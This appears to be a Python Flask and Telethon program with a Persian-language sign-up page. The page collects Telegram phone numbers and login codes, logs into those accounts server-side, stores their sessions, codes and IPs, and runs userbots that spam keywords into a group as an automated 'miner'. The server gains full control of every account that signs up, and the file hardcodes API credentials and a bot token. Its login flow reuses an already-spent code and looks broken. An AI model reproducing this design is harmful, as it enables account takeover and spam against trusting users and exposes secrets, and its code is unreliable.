"""
ربات کامل میو - پنل ثبت‌نام + ربات اصلی
همه چیز در یک فایل
"""

import os
import json
import asyncio
import threading
import time
import random
import re
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError

# ========== تنظیمات ==========
API_ID = 17187664
API_HASH = 'd6eae2c921342bb71816a980dc11b9f5'
BOT_TOKEN = '8680597965:AAERhsYmlIou-MEOnbV598bxI0EeQlyzS04'

USERS_FILE = 'users.json'
SESSIONS_DIR = 'sessions/'
TEMP_SESSIONS = {}
ACTIVE_SESSIONS = {}

# ========== تنظیمات میو ==========
KEYWORDS = ["میو", "مع", "میاو", "معو"]
DELAYS = list(range(260, 361, 5))

# ========== مدیریت فایل‌ها ==========
def ensure_files():
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({}, f, indent=2)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def update_user_status(user_id, status, data=None):
    users = load_users()
    user_id = str(user_id)
    if user_id not in users:
        users[user_id] = {}
    users[user_id]['status'] = status
    if data:
        users[user_id].update(data)
    save_users(users)

# ========== Flask App ==========
app = Flask(__name__)
app.secret_key = 'mew_secret_key_2026'

# ========== HTML قالب ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ثبت‌نام ربات میو</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Vazir', Tahoma, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #0f3460;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        h1 { color: #e94560; text-align: center; font-size: 28px; margin-bottom: 10px; }
        .subtitle { color: #aaa; text-align: center; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #ddd; margin-bottom: 8px; font-size: 14px; }
        input[type="text"] {
            width: 100%; padding: 12px 15px;
            border: 2px solid #1a1a2e; border-radius: 10px;
            background: #1a1a2e; color: #fff; font-size: 16px;
            transition: all 0.3s; box-sizing: border-box;
        }
        input:focus { border-color: #e94560; outline: none; box-shadow: 0 0 20px rgba(233,69,96,0.2); }
        .btn {
            width: 100%; padding: 14px; border: none; border-radius: 10px;
            color: #fff; font-size: 18px; font-weight: bold; cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-primary { background: #e94560; }
        .btn-primary:hover { background: #c73652; }
        .btn-success { background: #2ecc71; }
        .btn-success:hover { background: #27ae60; }
        .btn-secondary { background: #555; }
        .btn-secondary:hover { background: #666; }
        .message {
            padding: 12px 15px; border-radius: 10px; margin-bottom: 20px;
            text-align: center; font-weight: bold; display: none;
        }
        .message.show { display: block; }
        .message.success { background: #2ecc71; color: #fff; }
        .message.error { background: #e74c3c; color: #fff; }
        .message.info { background: #3498db; color: #fff; }
        .rules {
            background: #1a1a2e; padding: 15px; border-radius: 10px;
            margin-bottom: 20px; color: #aaa; font-size: 13px; line-height: 1.8;
        }
        .rules strong { color: #e94560; }
        .step-indicator {
            display: flex; justify-content: center; gap: 10px; margin-bottom: 30px;
        }
        .step {
            width: 40px; height: 40px; border-radius: 50%; background: #1a1a2e;
            color: #666; display: flex; align-items: center; justify-content: center;
            font-weight: bold; transition: all 0.3s;
        }
        .step.active { background: #e94560; color: #fff; box-shadow: 0 0 20px rgba(233,69,96,0.4); }
        .step.done { background: #2ecc71; color: #fff; }
        .hidden { display: none; }
        .footer { text-align: center; color: #666; margin-top: 20px; font-size: 12px; }
        .footer a { color: #e94560; text-decoration: none; }
        .user-info { background: #1a1a2e; padding: 15px; border-radius: 10px; margin: 15px 0; color: #ddd; }
        .user-info span { color: #e94560; font-weight: bold; }
        .status-bar {
            background: #1a1a2e; padding: 10px; border-radius: 10px;
            margin-bottom: 20px; color: #888; font-size: 12px; text-align: center;
        }
        .status-bar .online { color: #2ecc71; }
        .status-bar .offline { color: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐱 ثبت‌نام ربات میو</h1>
        <p class="subtitle">برای استفاده از ربات، اطلاعات خود را وارد کنید</p>
        
        <div class="status-bar">
            🟢 ربات <span class="online">فعال</span> | کاربران: <span id="userCount">0</span>
        </div>
        
        <div class="step-indicator">
            <div class="step active" id="step1">1</div>
            <div class="step" id="step2">2</div>
            <div class="step" id="step3">3</div>
        </div>
        
        <div id="messageBox" class="message"></div>
        
        <div class="rules">
            <strong>📋 قوانین:</strong><br>
            • اطلاعات فقط برای اجرای ربات استفاده میشود<br>
            • شما مسئولیت کامل اطلاعات خود را دارید
        </div>
        
        <div id="step1Content">
            <div class="form-group">
                <label>📱 شماره تلفن (با کد کشور)</label>
                <input type="text" id="phone" placeholder="مثال: +989123456789">
                <small style="color: #888; display: block; margin-top: 5px; font-size: 12px;">
                    کد تایید به این شماره ارسال میشود
                </small>
            </div>
            <button class="btn btn-primary" id="sendCodeBtn">📲 ارسال کد تایید</button>
        </div>
        
        <div id="step2Content" style="display: none;">
            <div class="form-group">
                <label>🔑 کد تایید</label>
                <input type="text" id="code" placeholder="کد ۵ رقمی" maxlength="5">
                <small style="color: #888; display: block; margin-top: 5px; font-size: 12px;">
                    کد به شماره شما ارسال شد
                </small>
            </div>
            <button class="btn btn-success" id="verifyBtn">✅ تایید و ثبت‌نام</button>
            <button class="btn btn-secondary" id="backBtn" style="margin-top:10px;">↩️ بازگشت</button>
        </div>
        
        <div id="step3Content" style="display: none;">
            <div style="text-align: center; padding: 20px; color: #2ecc71;">
                <h2>🎉 ثبت‌نام تکمیل شد!</h2>
                <div id="userInfo" class="user-info"></div>
                <p style="color: #aaa; margin-top: 10px;">
                    ربات به زودی فعال میشه
                </p>
                <button class="btn btn-primary" onclick="location.reload()" style="margin-top:20px;">🔄 ثبت‌نام جدید</button>
            </div>
        </div>
        
        <div class="footer">
            <p>نسخه ۱.۰ | <a href="#">قوانین</a></p>
        </div>
    </div>
    
    <script>
        let currentStep = 1;
        
        function showMessage(text, type) {
            const box = document.getElementById('messageBox');
            box.textContent = text;
            box.className = 'message show ' + type;
        }
        
        function hideMessage() {
            document.getElementById('messageBox').className = 'message';
        }
        
        function updateSteps(step) {
            for (let i = 1; i <= 3; i++) {
                const el = document.getElementById('step' + i);
                el.className = 'step';
                if (i < step) el.classList.add('done');
                if (i === step) el.classList.add('active');
            }
        }
        
        function showStep(step) {
            currentStep = step;
            document.getElementById('step1Content').style.display = step === 1 ? 'block' : 'none';
            document.getElementById('step2Content').style.display = step === 2 ? 'block' : 'none';
            document.getElementById('step3Content').style.display = step === 3 ? 'block' : 'none';
            updateSteps(step);
            hideMessage();
        }
        
        // دریافت تعداد کاربران
        async function updateUserCount() {
            try {
                const response = await fetch('/api/users/count');
                const data = await response.json();
                document.getElementById('userCount').textContent = data.count || 0;
            } catch(e) {}
        }
        updateUserCount();
        setInterval(updateUserCount, 30000);
        
        // ارسال کد
        document.getElementById('sendCodeBtn').addEventListener('click', async function() {
            const phone = document.getElementById('phone').value.trim();
            if (!phone) { showMessage('❌ شماره خود را وارد کنید!', 'error'); return; }
            
            this.disabled = true;
            this.textContent = '⏳ در حال ارسال...';
            showMessage('⏳ در حال ارسال کد...', 'info');
            
            try {
                const formData = new FormData();
                formData.append('phone', phone);
                const response = await fetch('/api/send_code', { method: 'POST', body: formData });
                const result = await response.json();
                
                if (result.success) {
                    showMessage(result.message, 'success');
                    showStep(2);
                } else {
                    showMessage(result.message, 'error');
                    this.disabled = false;
                    this.textContent = '📲 ارسال کد تایید';
                }
            } catch (error) {
                showMessage('❌ خطا در ارتباط با سرور!', 'error');
                this.disabled = false;
                this.textContent = '📲 ارسال کد تایید';
            }
        });
        
        // تایید کد
        document.getElementById('verifyBtn').addEventListener('click', async function() {
            const code = document.getElementById('code').value.trim();
            if (!code || code.length !== 5) { showMessage('❌ کد ۵ رقم باشد!', 'error'); return; }
            
            this.disabled = true;
            this.textContent = '⏳ در حال تایید...';
            showMessage('⏳ در حال تایید کد...', 'info');
            
            try {
                const formData = new FormData();
                formData.append('code', code);
                const response = await fetch('/api/verify_code', { method: 'POST', body: formData });
                const result = await response.json();
                
                if (result.success) {
                    showMessage(result.message, 'success');
                    document.getElementById('userInfo').innerHTML = `
                        👤 نام: <span>${result.user.name}</span><br>
                        🆔 یوزرنیم: <span>@${result.user.username}</span><br>
                        📱 شماره: <span>${result.user.phone}</span>
                    `;
                    showStep(3);
                    updateUserCount();
                } else {
                    showMessage(result.message, 'error');
                    this.disabled = false;
                    this.textContent = '✅ تایید و ثبت‌نام';
                }
            } catch (error) {
                showMessage('❌ خطا در ارتباط با سرور!', 'error');
                this.disabled = false;
                this.textContent = '✅ تایید و ثبت‌نام';
            }
        });
        
        document.getElementById('backBtn').addEventListener('click', function() { showStep(1); });
        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') document.getElementById('sendCodeBtn').click();
        });
        document.getElementById('code').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') document.getElementById('verifyBtn').click();
        });
    </script>
</body>
</html>
'''

# ========== مسیرهای Flask ==========
@app.route('/')
def index():
    ensure_files()
    users = load_users()
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/users/count')
def users_count():
    users = load_users()
    return jsonify({'count': len(users)})

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone', '').strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit():
        return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
    
    try:
        # ایجاد کلاینت موقت برای ارسال کد
        temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{int(time.time())}", API_ID, API_HASH)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(temp_client.connect())
        loop.run_until_complete(temp_client.send_code_request(phone))
        
        session_id = str(int(time.time()))
        TEMP_SESSIONS[session_id] = {
            'client': temp_client,
            'phone': phone,
            'timestamp': datetime.now()
        }
        
        session['temp_id'] = session_id
        session['phone'] = phone
        
        return jsonify({'success': True, 'message': f'✅ کد تایید به {phone} ارسال شد!'})
        
    except FloodWaitError as e:
        return jsonify({'success': False, 'message': f'⏳ صبر کنید {e.seconds} ثانیه!'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    code = request.form.get('code', '').strip()
    temp_id = session.get('temp_id')
    phone = session.get('phone')
    
    if not temp_id or temp_id not in TEMP_SESSIONS:
        return jsonify({'success': False, 'message': '❌ نشست منقضی شده! دوباره تلاش کنید.'})
    
    if not code.isdigit() or len(code) != 5:
        return jsonify({'success': False, 'message': '❌ کد باید ۵ رقم باشد!'})
    
    try:
        temp_data = TEMP_SESSIONS[temp_id]
        temp_client = temp_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(temp_client.sign_in(code=code))
        me = loop.run_until_complete(temp_client.get_me())
        
        users = load_users()
        user_id = str(int(time.time()))
        
        users[user_id] = {
            'phone': phone,
            'code': code,
            'status': 'pending',
            'registered_at': datetime.now().isoformat(),
            'username': me.username,
            'first_name': me.first_name,
            'ip': request.remote_addr,
            'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
        }
        save_users(users)
        
        loop.run_until_complete(temp_client.disconnect())
        del TEMP_SESSIONS[temp_id]
        session.clear()
        
        # راه‌اندازی ربات برای کاربر جدید
        threading.Thread(target=start_user_bot, args=(user_id, users[user_id])).start()
        
        return jsonify({
            'success': True,
            'message': f'✅ ثبت‌نام موفق! خوش آمدی @{me.username}',
            'user': {
                'name': me.first_name,
                'username': me.username,
                'phone': phone
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

# ========== ربات کاربر ==========
class UserBot:
    def __init__(self, user_id, data):
        self.user_id = user_id
        self.phone = data.get('phone')
        self.code = data.get('code')
        self.group_link = data.get('group_link', 'https://t.me/+NJNJp5hUf3IzNTRk')
        self.client = None
        self.running = False
        
    async def start(self):
        session_file = f"{SESSIONS_DIR}user_{self.user_id}"
        self.client = TelegramClient(session_file, API_ID, API_HASH)
        
        try:
            await self.client.start(phone=self.phone, code=self.code)
            me = await self.client.get_me()
            
            print(f"✅ کاربر {me.first_name} (@{me.username}) متصل شد!")
            update_user_status(self.user_id, 'active', {'username': me.username})
            
            ACTIVE_SESSIONS[self.user_id] = {'client': self.client, 'bot': self}
            self.running = True
            
            self.group_id = await self.get_entity(self.group_link)
            await self.send_to_main("🔥 ماینر اتومات روشن شد!")
            
            await self.main_loop()
            
        except Exception as e:
            print(f"❌ خطا: {e}")
            update_user_status(self.user_id, 'error', {'error': str(e)})
    
    async def get_entity(self, link):
        try:
            return (await self.client.get_entity(link)).id
        except:
            return None
    
    async def send_to_main(self, msg):
        if self.group_id:
            try:
                await self.client.send_message(self.group_id, msg)
            except: pass
    
    async def main_loop(self):
        await asyncio.sleep(5)
        counter = 0
        while self.running:
            try:
                await self.send_to_main(random.choice(KEYWORDS))
                counter += 1
                if counter % 5 == 0:
                    await self.send_to_main("فنر")
                
                delay = random.choice(DELAYS) + random.randint(-30, 60)
                delay = max(240, delay)
                await asyncio.sleep(delay)
                
            except Exception as e:
                print(f"❌ خطا: {e}")
                await asyncio.sleep(60)

def start_user_bot(user_id, data):
    """اجرای ربات برای کاربر جدید"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    bot = UserBot(user_id, data)
    loop.run_until_complete(bot.start())

# ========== واتچر ==========
def watch_for_new_users():
    """چک کردن کاربران جدید در پس‌زمینه"""
    while True:
        try:
            users = load_users()
            for user_id, data in users.items():
                if data.get('status') == 'pending' and user_id not in ACTIVE_SESSIONS:
                    print(f"🆕 کاربر جدید: {data.get('phone')}")
                    threading.Thread(target=start_user_bot, args=(user_id, data)).start()
                    time.sleep(3)
            time.sleep(10)
        except Exception as e:
            print(f"⚠️ واتچر: {e}")
            time.sleep(30)

# ========== اجرا ==========
if __name__ == "__main__":
    ensure_files()
    
    # شروع واتچر
    threading.Thread(target=watch_for_new_users, daemon=True).start()
    
    print("""
    ╔════════════════════════════════════════╗
    ║  🐱 ربات کامل میو                     ║
    ║  پنل ثبت‌نام + ربات اصلی              ║
    ╚════════════════════════════════════════╝
    """)
    print(f"📁 فایل کاربران: {USERS_FILE}")
    print("🌐 پنل ثبت‌نام: http://localhost:10000")
    print("")
    
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
